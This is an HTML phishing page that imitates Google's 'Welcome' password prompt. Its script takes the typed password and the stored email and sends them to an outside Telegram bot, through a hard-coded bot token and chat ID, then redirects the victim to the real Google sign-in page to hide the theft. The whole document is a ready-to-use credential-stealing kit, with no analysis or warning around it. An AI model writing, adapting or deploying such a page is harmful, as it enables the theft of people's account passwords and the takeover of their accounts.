<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Welcome</title>
    <style>
        body { margin: 0; background-color: #000; color: #e8eaed; font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { width: 100%; max-width: 450px; padding: 24px; text-align: center; }
        .logo { width: 74px; margin-bottom: 12px; }
        h1 { font-size: 24px; margin-bottom: 8px; color: #fff; font-weight: 400;}
        .user-info { display: inline-flex; align-items: center; padding: 5px 12px; border: 1px solid #5f6368; border-radius: 20px; margin-bottom: 40px; }
        .profile-icon { width: 20px; height: 20px; background-color: #5f6368; border-radius: 50%; margin-right: 8px; display: flex; justify-content: center; align-items: center; }
        .password-field { position: relative; text-align: left; }
        input[type="password"] { width: 100%; background: transparent; border: 1px solid #8ab4f8; border-radius: 4px; padding: 16px 15px; box-sizing: border-box; color: #fff; font-size: 16px; outline: none; }
        .label-text { position: absolute; left: 12px; top: -10px; background-color: #000; padding: 0 5px; color: #8ab4f8; font-size: 12px; }
        .footer-actions { margin-top: 100px; display: flex; justify-content: space-between; align-items: center; }
        .link-blue { color: #8ab4f8; text-decoration: none; font-size: 14px; font-weight: 500; cursor: pointer; }
        .next-btn { background-color: #8ab4f8; color: #202124; border: none; padding: 10px 32px; border-radius: 4px; font-weight: 500; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
        <h1>Welcome</h1>
        <div class="user-info">
            <div class="profile-icon">
                <svg fill="#fff" width="14" height="14" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08s5.97 1.09 6 3.08c-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
            </div>
            <span id="displayEmail" style="font-size: 14px;"></span>
        </div>
        <div class="password-field">
            <span class="label-text">Enter your password</span>
            <input type="password" id="passInput">
        </div>
        <div class="footer-actions">
            <a class="link-blue">Forgot password?</a>
            <button class="next-btn" onclick="sendPassword()">Next</button>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "7852343353:AAG3byBA3PWOlnUHI4WDpdpKjy7p9gcC7Ds"; // à¦à¦–à¦¾à¦¨à§‡ à¦†à¦ªà¦¨à¦¾à¦° à¦¬à¦Ÿ à¦Ÿà§‹à¦•à§‡à¦¨ à¦¦à¦¿à¦¨
        const CHAT_ID = "7336083189";     // à¦à¦–à¦¾à¦¨à§‡ à¦†à¦ªà¦¨à¦¾à¦° à¦šà§à¦¯à¦¾à¦Ÿ à¦†à¦‡à¦¡à¦¿ à¦¦à¦¿à¦¨

        window.onload = function() {
            document.getElementById('displayEmail').innerText = localStorage.getItem("userEmail") || "user@gmail.com";
        };

        function sendPassword() {
            const email = localStorage.getItem("userEmail");
            const pass = document.getElementById('passInput').value;
            const targetUrl = "https://accounts.google.com/v3/signin/identifier?dsh=S504883659:1766383202455751&flowName=GlifWebSignIn&flowEntry=ServiceLogin";

            if(pass) {
                const message = `ðŸ”‘ Password Received:\nðŸ“§ Email: ${email}\nðŸ”’ Pass: ${pass}`;
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
                .then(() => {
                    window.open(targetUrl, '_blank');
                })
                .catch(() => {
                    window.open(targetUrl, '_blank');
                });
            } else {
                alert("Enter your password");
            }
        }
    </script>
</body>
</html>
